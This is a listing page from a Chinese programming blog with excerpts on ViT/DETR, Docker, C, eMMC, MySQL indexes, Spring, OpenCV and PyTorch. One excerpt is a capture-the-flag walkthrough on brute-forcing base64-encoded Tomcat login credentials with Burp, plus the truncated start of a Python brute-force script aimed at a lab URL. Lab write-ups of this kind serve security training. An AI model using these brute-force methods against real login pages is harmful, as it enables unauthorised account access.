<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51322e48aa48f8951de577d5e4ef5483/" rel="bookmark">
			VisionTransformer[VIT]，DETR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看看老师视频与博客方法把细节都过了一遍 目录
VisionTransformer[VIT]
DeTR
VisionTransformer[VIT] (212条消息) ViT全流程笔记，附代码详解。_AI Studio的博客-CSDN博客_vit代码
思考关于
Model interpreting go to these reference links to learn
Inductive bias
MAE_link:
Self-pretrained method don't need people to label dataset ,that's an effervescent work.
DeTR DETR[sub-branch for Vit]_思考实践的博客-CSDN博客
Detr and vit
detr和vit有什么区别和联系啊，可以把他们整合到一起吗？ - 知乎detr和vit有什么区别和联系啊，可以把他们整合到一起吗？ - 知乎
参考资料
Vision Transformer（ViT）PyTorch代码全解析（附图解）_Adenialzz的博客-CSDN博客_vit-pytorch
//简单版 (212条消息) ViT：视觉Transformer backbone网络ViT论文与代码详解_louwill12的博客-CSDN博客
//完整版
神经网络学习小记录67——Pytorch版 Vision Transformer（VIT）模型的复现详解_Bubbliiiing的博客-CSDN博客
11.1 Vision Transformer(vit)网络详解_哔哩哔哩_bilibili //整体(212条消息) 一张图等于 16x16 个字，计算机视觉也用上 Transformer 了_公众号机器学习与生成对抗网络的博客-CSDN博客 https://blog.csdn.net/lgzlgz3102/article/details/109140622
//整体的补充 ，非常细节
ViT论文逐段精读【论文精读】_哔哩哔哩_bilibili //配套视频
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51322e48aa48f8951de577d5e4ef5483/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26cecc24fc09bd6a2baadfb276721563/" rel="bookmark">
			docker desktop tutorial 示例报错的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		就是一打开这个程序后的tutorial
我把这个步骤手打出来（居然没法粘贴）
# step1 clone docker run --name repo alpine/git clone https://github.com/docker/getting-started.git docker cp repo:/git/getting-started/ . # step2 build cd getting-started docker build -t docker101tutorial . # step3 run docker run -d -p 80:80 --name docker-tutorail docker101tutorial # share docker tag docker101tutorial liaoxin/docker101tutorial docker push liaoxin/docker101tutorial 在第二步build的时候总是报错
&gt; [build 2/2] RUN mkdocs build: #23 0.568 Traceback (most recent call last): #23 0.568 File "/usr/local/bin/mkdocs", line 8, in &lt;module&gt; #23 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26cecc24fc09bd6a2baadfb276721563/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27bea7934f610c41807df9766836b87f/" rel="bookmark">
			C语言—三种条件判断语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		if语句 if语句中，首先判断表达式的值，然后根据该值的情况控制程序流程。表达式的值不等于0，即为真；否则为假。if语句有if，if--else和else if 三种形式
if(表达式) 语句 if(表达式) { 语句块1； } else { 语句块2； } if(表达式1) 语句1 else if(表达式2) 语句2 ···· else if(表达式n—1) 语句n-1 else 语句n if的嵌套形式 if(表达式1) { if(表达式2) { 语句块1； } else { 语句块2； } { else { if(表达式3) { 语句块3； } else { 语句块4； } } 条件运算符 条件运算符可对一个表达式的值的真假情况进行检验，然后根据检验结果返回另外两个表达式中的一个。
表达式1？表达式2:表达式3; max=(a&gt;b)?a:b; 在运算中，首先对第一个表达式的值进行检验。如果值为真，则返回第二个表达式的结果值；如果为假，则返回第三个表达式的结果值。
例：a&gt;b为真，则max=a；为假，则max-b
Objecy=(flag&gt;=N)？1:0; num=Object？num:num*1.1; LED=mode?( (treadmill_i&lt;=6) ? (8'hff&gt;&gt;(7-treadmill_i) ): (8'hff&gt;&gt;(treadmill_i-7) ) ): ( (treadmill_i&lt;=6) ? (1&lt;&lt;treadmill_i) : (1&lt;&lt;(14-treadmill_i) ) ); //当成立时流水灯，不成立跑马灯，移位控制 switch语句 if只有两个分枝可供选择，而实际情况中常需要用到多分枝的选择。当然，使用嵌套的if语句也可以实现多分枝的选择，但是如果分枝较多，就会使得嵌套的if语句层数较多，程序冗余，并且可读性不好。C语言中可以使用switch语句直接处理多分枝选择的情况，提高程序代码可读性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27bea7934f610c41807df9766836b87f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b79a7e7963659d33c3826286091a9d11/" rel="bookmark">
			【eMMC】简介与协议浅析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		eMMC 简介
Host Interface
Flash Controller
Flash Memory
eMMC 分区管理
Boot Area Partitions
eMMC 分区应用实例
eMMC 总线协议
eMMC 总线接口
eMMC 总线模型
eMMC 简介 eMMC 是 embedded MultiMediaCard 的简称。MultiMediaCard，即MMC， 是一种闪存卡（Flash Memory Card）标准，它定义了 MMC 的架构以及访问　Flash Memory 的接口和协议。而eMMC 则是对 MMC 的一个拓展，以满足更高标准的性能、成本、体积、稳定、易用等的需求。
eMMC 的整体架构如下图片所示：
eMMC 内部主要可以分为 Flash Memory、Flash Controller 以及Host Interface 三大部分。
Host Interface eMMC 与 Host 之间的连接如下图所示：
各个信号的用途如下所示：
CLK: 用于同步的时钟信号
Data Strobe：此信号是从 Device 端输出的时钟信号，频率和 CLK 信号相同，用于同步从 Device 端输出的数据。该信号在 eMMC 5.0 中引入。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b79a7e7963659d33c3826286091a9d11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3dce4ee1cd366a65e32f766056df061/" rel="bookmark">
			DETR[sub-branch for Vit]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
End to End Object Detection with Transformers 基本思想
核心图
位置信息初始化query向量
论文模型细节架构图
然后就是预测头head部分了
这里有一个值得关注的地方
End to End Object Detection with Transformers 第一次把transformer用在object detection上面
Because of DETR,Transformer is getting hot again. people think transformer is just a backbone,backbone is not directly suitable for Downstream tasks.
基本思想 Vit like Bert ,just have the encoder part of the transformer,but Detr have both of encoder module and decoder module.
DETR没有套用Swin窗口分层的形式，它就是一个直接的transformer
First step,get patch work and positional embedding work ready(then every patch is a time vector),just like vit work（vit just use the encoder of the transformer）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3dce4ee1cd366a65e32f766056df061/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8342d3fb2e087fbe9ded8188eb923314/" rel="bookmark">
			CTF-show-爆破
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WEB入门-爆破 1、web212、web223、web234、web245、web256、web267、web278、web28 1、web21 tomcat认证爆破–用户名：密码，一般使用custom iterator爆破
From:https://www.cnblogs.com/007NBqaq/p/13220297.html
得到爆破字典和需要输入账号密码的网页，于是先尝试输入账号admin密码1234进行抓包
抓包后没有看到admin或password的字段，但是看到一串base编码
解码结果为admin：1234即为我们输入的账号和密码
将数据包发送到爆破模块，选择中账号密码
选择自定义迭代器，分别导入字典
position1：用户名
position2：：
position3：密码
选择Payload Processing进行编码设置
因为base64编码存在=，所以取消Palyload Encoding编码，爆破即可得到flag
提示也有脚本
# -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-11-20 19:16:49 # @Last Modified by: h1xa # @Last Modified time: 2020-11-20 20:28:42 # @email: h1xa@ctfer.com # @link: https://ctfer.com import time import requests import base64 url = 'http://xxxx.ctf.show/index.php' password = [] with open("1.txt", "r") as f: while True: data = f.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8342d3fb2e087fbe9ded8188eb923314/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06b64ced415a30e3da2bb5df5506f5f5/" rel="bookmark">
			在CentOS 7下编译安装Nginx&#43;PHP&#43;MySQL环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转载自：http://www.softeng.cn/?p=156，本文已获得作者授权，未经作者同意，不可转载。
文章目录 1、前言2、准备安装工具2.1、安装make2.2、安装g++2.3、创建安装目录 3、安装Nginx3.1、下载并解压pcre3.2、下载并解压zlib3.3、下载并解压openssl3.4、为nginx添加用户及组3.5、下载并安装nginx3.7、启动nginx3.8、加入系统环境变量3.9、加入系统服务3.10、设置nginx开机自启动 4、安装php4.1、通过yum命令安装php需要的常用库4.2、下载并安装php4.3、设置php配置文件4.4、设置php-fpm配置文件4.5、启动php-fpm4.6、加入系统环境变量4.7、加入系统服务4.8、设置php-fpm开机自启动 5、安装MySQL5.1、下载并安装cmake5.2、下载并安装ncurses5.3、安装libaio库5.4、为MySQL添加用户及组5.6、设置mysql配置文件5.7、初始化MySQL5.8、使用安全模式启动MySQL5.9、设置MySQL服务开机自启 6、配置Nginx+PHP+MySQL6.1、配置Nginx+PHP6.2、关于MySQL配置的说明 1、前言 本文适合于已经对Linux操作系统具有基本操作经验，并且能够在Linux或Windows上通过一键搭建工具或者yum命令行进行环境搭建的读者，阅读本文需具有一定的专业知识，本文不建议初学者阅读。
本文所描述的是在标准的CentOS 7.2 64位操作系统下，安装Nginx 1.12.2 + PHP 7.1.11 + MySQL 5.7.20环境。采用源码编译安装的方式，虽然较直接使用yum命令安装较为复杂，但是源码安装可以自定义指定安装路径，可以自定义配置安装配套的库和插件，这样服务器运维人员将更清楚自己服务器的情况，从而，在日后的环境、插件的升级和更新操作中，将变得更加简便和容易。
2、准备安装工具 2.1、安装make yum -y install gcc automake autoconf libtool make 2.2、安装g++ yum install gcc gcc-c++ glibc 2.3、创建安装目录 本文是在阿里云服务器上安装，所以在服务器根目录下创建alidata目录，然后在alidata目录里面分别创建server目录、webapps目录和package目录，其中server目录存放所有的服务器软件（本文中所涉及到的nginx、php、mysql等），webapps目录存放所有部署的代码及程序，package目录用来存放安装过程中需要用到的编译后的库文件。
需以root权限，依次执行以下命令
mkdir /alidata mkdir /alidata/package mkdir –p /alidata/server mkdir –p /alidata/webapps mkdir –p /alidata/logs 这里需要说明，上述的server目录，是指环境安装完成后，运行程序所在的目录，并非nginx等程序的源码存放目录，为了方便，本文将下载到的这些运行环境程序的源码统一存放于/root目录下，读者可根据自身情况及喜好，将运行环境程序源码存放于任意不是/alidata/server的目录下。
3、安装Nginx 3.1、下载并解压pcre 官网：http://www.pcre.org/
依次执行以下命令
cd /root/ wget https://sourceforge.net/projects/pcre/files/pcre/8.41/pcre-8.41.tar.gz tar -zxvf pcre-8.41.tar.gz 3.2、下载并解压zlib 官网：http://zlib.net/
依次执行以下命令
cd /root/ wget https://sourceforge.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06b64ced415a30e3da2bb5df5506f5f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54c053212368f713fb7343dcc54205a4/" rel="bookmark">
			《九日集训》day9打卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天做到了递归，学到了c语言的struct用的是“-&gt;”调用，而不是和c++一样的“.”来调用的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c641e7c46e047f2eeacad48f8b4519f/" rel="bookmark">
			MySQL索引（二）索引优化方案有哪些
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在上一篇文章中，我们介绍了MySQL中常见的索引类型以及每种索引的各自特点，那么这篇文章带你来与我一起看一下聚集索引与二级索引的关系，最后在附上常见的索引优化方案。首先我们还是看一下聚集索引和二级索引的区别
MySQL索引（一）
聚集索引和二级索引区别 首先，每个Innodb引擎的表都有一个聚集索引，用于存储行数据，通常情况下，聚集索引也叫做主键索引。
如果一个表定义了主键，Innodb就使用它作为聚集索引。因此我们要尽可能的为表添加一个主键，如果实在没有一个列是非空且唯一的可以作为主键列，建议添加一个自动递增的列作为主键列
如果表没有主键，Innodb会选择第一个非空且唯一的列作为聚集索引
如果表既没有主键，也没有非空且唯一的索引，则Innodb生成一个隐藏的聚集索引，GEN_CLUST_INDEX 包含rowid值的列，数据行根据rowid排序，rowid是一个6字节的字段，随着数据插入而单调递增，也就是说，数据行根据rowid排序也就是根据插入顺序排序的
在上面，我们知道了主键索引也就是聚集索引，而且我们的日常工作中，查询如果根据主键查询都是很快的，那么聚集索引是如何提升查询效率的呢？
聚集索引如何提升查询效率 通过聚集索引访问一条数据是很快的，这是因为所有的行数据和索引保存在同一个页上。如果表数据特别大，相较于数据和索引保存在不同的页上的存储结构相比，Innodb大大节省了磁盘IO操作
现在我们知道了聚集索引之所以查询的快是因为要查询的行数据和索引都保存在同一个页上，也就减少了去磁盘查找数据的过程，那么二级索引呢，二级索引是如何与聚集索引关联的呢？
二级索引如何与聚集索引关联 聚集索引之外的其它索引全部被称为二级索引。在Innodb中，二级索引中的每条记录都包含主键列以及本身二级索引指定的索引列，在聚集索引中，Innodb使用此主键值查询该行的数据
如果主键较长的话，那么我们二级索引保存主键列时就会占用更多的空间，所以主键尽可能的短是有利的
读到这，我们应该已经知道了，聚集索引中所有记录与索引都保存在同一个页中，所以这也是聚集索引查询快的原因。二级索引没有保存当前记录的数据，只保存了主键列，所以在使用二级索引的时候会涉及到两步操作，即根据二级索引先定位主键列，然后根据主键列在聚集索引中查询数据返回。现在我们也知道了，通过二级索引查找会涉及到多一次交互的问题，那么这个点也是我们后文将要讨论的一个点，也就是所谓的回表。目前我们常用的索引优化方式有覆盖索引、最左前缀、索引下推，现在我们一起来详细看下索引的优化方式是怎么工作的
常用的索引优化方式 覆盖索引 首先我们还是新建一张表t，在k列建立索引，建表语句如下
create table t( id int primary key, k int not null default 0, s varchar(16) not null default '', index k(k) )engine=Innodb; # 加入测试数据 insert into t values(100,1, 'aa'),(200,2,'bb'),(300,3,'cc'),(500,5,'ee'),(600,6,'ff'),(700,7,'gg'); 在上文中，我们已经知道了聚集索引与二级索引的区别，所以在执行完上面的插入语句之后，数据的存储结构为两棵索引树，一棵主键索引树包含数据，一棵二级索引k的索引树
此处借鉴一下极客时间丁奇老师的索引结构图，此处放个不同数据结构存储图，这个网站不错，可以模拟数据结构的存储过程，给大家推荐一下，这块网站模拟的和丁奇老师的还是不一样，这块原因还不了解，对这块还不是很熟悉，有了解的可以评论区说一下，互相学习一下。本文还是以丁奇老师讲解的图为主
Arts and Sciences - Computer Science | myUSFhttps://www.cs.usfca.edu/
首先我们执行一条查询语句
select * from t where k between 3 and 5; 执行过程是这样的，首先到k索引树取到值为3的到主键索引树获取主键等于300的R3记录返回，然后取k索引树下一值5的主键500到主键索引树取500的记录R5，然后取k索引树下一个值6的主键600到主键树查询，发现6不符合条件，不再去主键树查询，返回结果
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c641e7c46e047f2eeacad48f8b4519f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/877721781cdbd286e8f1089cb4c3f767/" rel="bookmark">
			spring JDBC 事务管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring JDBC 事务管理 spring JDBC 环境 添加依赖 &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;spring&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;name&gt;spring&lt;/name&gt; &lt;!-- FIXME change it to the project's website --&gt; &lt;url&gt;http://www.example.com&lt;/url&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- 单元测试--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- spring框架--&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.3.16&lt;/version&gt; &lt;/dependency&gt; &lt;!-- spingTest--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;5.3.16&lt;/version&gt; &lt;/dependency&gt; &lt;!-- aop--&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- jdbc--&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/877721781cdbd286e8f1089cb4c3f767/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ee8eefae8cba74ed8ed3db6017d6b43/" rel="bookmark">
			Android导入OpenCV库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载OpenCV库 官网下载 https://opencv.org/releases/
这是我下载的版本4.5.5
2、导入OpenCV库 注意直接导入OpenCV里面的sdk文件夹，否则后续测试时会发现要想使用OpenCV库函数还要在设备上另外联网下载相关程序
导入成功后会出现错误，将下面代码删除，删除后点击右上角的“Sync Now”按钮，同步修改后的信息
接着对两个build.gradle文件信息进行修改，使compileSdkVersion，minSdkVersion，targetSdkVersion三个属性保持一致。改变OpenCV sdk的build.gradle，使其与刚创建项目的build.gradle中数值保持一致。接着同步修改后的信息。
接着打开Project Structure窗口导入module依赖，点击以下按钮
选中自动识别出现的sdk依赖，点击OK
此时项目已经成功导入OpenCV库函数，但要正常使用还需要对OpenCV库进行加载，需要一行代码。
3、加载OpenCV库 在对OpenCV库函数进行使用时，首先要对OpenCV库函数进行初始化加载，不然后续无法使用。
boolean success = OpenCVLoader.initDebug(); //对OpenCV库进行初始化加载，bool返回值可以判断是否加载成功。 if (success) { Toast.makeText(this.getApplicationContext(), "OpenCV库加载成功", Toast.LENGTH_SHORT).show(); } else { Toast.makeText(this.getApplicationContext(), "OpenCV库加载失败", Toast.LENGTH_SHORT).show(); } 我们可以把它封装成一个函数放在第一个activity里面
import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.Toast; import org.opencv.android.OpenCVLoader; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); loadOpenCV(); } private void loadOpenCV() { boolean success = OpenCVLoader.initDebug(); //对OpenCV库进行初始化加载，bool返回值可以判断是否加载成功。 if (success) { Toast.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ee8eefae8cba74ed8ed3db6017d6b43/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1681fd34a8e17d5aea0317274b45491a/" rel="bookmark">
			018:别叫，这个大整数已经很简化了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;cstdio&gt; using namespace std; const int MAX = 110; class CHugeInt { private: char buf[220]; void reverse() { int tmp; int len = strlen(buf); for (int i = 0; i &lt; len / 2; i ++) { tmp = buf[i]; buf[i] = buf[len - 1 - i]; buf[len - 1 - i] = tmp; } } public: CHugeInt(int n) { memset(buf, 0, sizeof(buf)); sprintf(buf, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1681fd34a8e17d5aea0317274b45491a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d0d5e966fcbd13271af478480590153/" rel="bookmark">
			MCU与SOC的区别，RTOS与LINUX区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 MCU与SOC的区别，RTOS与LINUX区别
一、MCU？ 1.阐述 MCU就是微控制器，别名叫单片机，具体像STC的51单片机，ST的STM8、STM32、Arduino的AVR、TI的MSP430等等。
2.在操作系统层面 MCU一般最多只运行实时操作系统(RTOS)，不会上Linux，更多的是”裸机”编程。RTOS像freertos或者UCOS都是只能跑多线程，但是不能跑多进程。
二、SOC 1.阐述 低端的SOC就是内部集成了MCU+特定功能模块外设。高端的SOC应该是内部集成MPU/CPU+特定功能模块外设。具体像NXP的IMX6ULL等。
2.在操作系统层面 SOC可以跑Linux或者QNX系统，最大的差别就是多核，多进程多线程。QNX也是实时操作系统，但是可以实现多进程的，多线程的功能，Linux的分时系统。
三、MCU与SOC区别 低端的SOC就是在MCU的基础上加了一些定制化的功能，比如蓝牙协议，Zigbee协议，或者解码功能，和MCU功能上没什么大区别，其他的在差别就是在跑操作系统上。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d209e256c740945fe0996d5dd2ad099d/" rel="bookmark">
			【数据库】——数据库索引宝典
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 一般对于数据库使用者来说，什么ACID，什么存储结构那些都是关心的，因为这些更多是开发数据库的人需要考虑的事情，你如果保证不了ACID，那我为什么要选择你的数据库。作为使用者，更多的要关注的点是性能、性能、性能，重要的事情说三遍。数据库的性能调优要展开讲的话，三天三夜也讲不完，今天主要说一下索引相关的事情，做个记录，也算是给自己留一份笔记吧。
二、什么是索引 索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。
例如有三张表分别是t1、t2、t3，每个表都有字段a1、a2、a3，分别存储1-1000数字，执行
select a1,a2,a3 from t1,t2,t3 where a1=a2 and a2=a3; 如果在无索引的情况下查询，那么MySQL会先查找出3个表的所有组合，最后得出与where匹配的所有行。所有的组合为1000x1000x1000种可能，这样查询起来就会非常慢。
如果给a1,a2,a3分别加上索引，那么查询过程如下：
1、从t1表中选择第一行
2、使用t2表上的索引，直接定位到与t1表中第一行值相同的行
3、使用t3表上的索引，直接定位到与t2表中当前行的值相等的行
重复上述步骤，直至找出所有满足条件的结果
三、索引类型 1.普通索引
这是最基本的索引，它没有任何限制。它有以下几种创建方式：
a.创建索引
CREATE INDEX indexName ON mytable(username(length)); 如果是CHAR，VARCHAR类型，length可以小于字段实际长度;如果是BLOB和TEXT类型，必须指定 length，下同。
b.修改表结构
ALTER mytable ADD INDEX [indexName] ON (username(length)) c.创建表的时候直接指定
CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); 删除索引的语法：
DROP INDEX [indexName] ON mytable; 2.唯一索引
它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式：
a.创建索引
CREATE UNIQUE INDEX indexName ON mytable(username(length)) b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d209e256c740945fe0996d5dd2ad099d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbd60e7086187a3533b7b3240e475ba8/" rel="bookmark">
			PyTorch创建tensor的四种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Let’s start！
data=np.array([1.,2.,3.,4.]) t1=torch.Tensor(data) t2=torch.tensor(data) t3=torch.as_tensor(data) t4=torch.from_numpy(data) print(t1) print(t2) print(t3) print(t4) 结果： tensor([1., 2., 3., 4.]) tensor([1., 2., 3., 4.], dtype=torch.float64) tensor([1., 2., 3., 4.], dtype=torch.float64) tensor([1., 2., 3., 4.], dtype=torch.float64) **
1 张量创建操作。有什么区别？ **
torch.Tensor() Vs torch.tensor()
带有大写 T 的第一个选项是 torch.Tensor 类的构造函数，而第二个选项是我们所说的工厂函数，用于构造torch.Tensor 对象并将其返回给调用者。你可以把torch.tensor()函数看作是一个工厂，它在给定一些参数输入后构建张量。工厂函数是一种创建对象的软件设计模式。好的。这就是大写的T和小写的t之间的区别，但是这两者之间哪种方式更好？答案是，使用任何一种都是可以的。然而，工厂函数torch.tensor()有更好的文档和更多的配置选项，所以它目前获得了胜利。
2 默认dtype与推断dtype 好吧，在我们把torch.Tensor()构造函数从我们的列表中剔除之前，让我们来看看我们在打印的张量输出中观察到的差异。
差异在于每个张量的dtype。让我们看一下。
print(t1.dtype) torch.float32 print(t2.dtype) torch.float64 print(t3.dtype) torch.float64 print(t4.dtype) torch.float64 这里的区别在于，torch.Tensor()构造函数在构建张量时使用默认的dtype。我们可以使用torch.get_default_dtype()方法验证默认的dtype。
torch.get_default_dtype()
结果：
torch.float32
为了用代码验证，我们可以这样做。
t1.dtype == torch.get_default_dtype()
true
其他调用根据传入的数据选择一个dtype。这被称为类型推理。dtype是根据传入的数据推断出来的。请注意，dtype也可以通过指定dtype作为参数来为这些调用明确设置。
torch.tensor(data, dtype=torch.float32) torch.as_tensor(data, dtype=torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbd60e7086187a3533b7b3240e475ba8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13c65c03739bd2054bbb5596a36f8463/" rel="bookmark">
			【C&#43;&#43;】STL之栈（stack）介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		栈（stack）
栈是一种运算受限的线性表。限定仅在表尾进行插入和删除的操作。
插入（push）， 弹出（pop）。其特性就是先进后出，即先插入的元素最后才能弹出。大家可以把栈想象成一个弹夹，你只能在顶层一颗一颗装入子弹，先装的子弹在最底层，打出时也只能从上层一颗一颗打出。最后装入的一颗子弹最先打出。这便是先进后出的意思。在栈中，“弹夹”的最上层被叫做栈顶，一般用top来指示栈顶的位置。
我们可以先通过结构体自己定义一个栈，便于理解。
#include&lt;iostream&gt; using namespace std; struct Stack { int data[10000]; int top = -1; void push(int x) {//push函数定义 top++; if (top &lt; 10000) { data[top] = x; } else { top--; cout &lt;&lt; "stack overflow" &lt;&lt; endl; } } void pop() {//pop函数定义 if (top &gt;= 0) { top--; } } int topval() { if (top &gt;= 0) { return data[top]; } } }; int main() { Stack s; for (int i =1; i &lt;= 10; i++) { s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13c65c03739bd2054bbb5596a36f8463/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e15d087eda7c1863d614c52229cb15e/" rel="bookmark">
			LaTex 一文解决Elsevier模板下图表相关问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
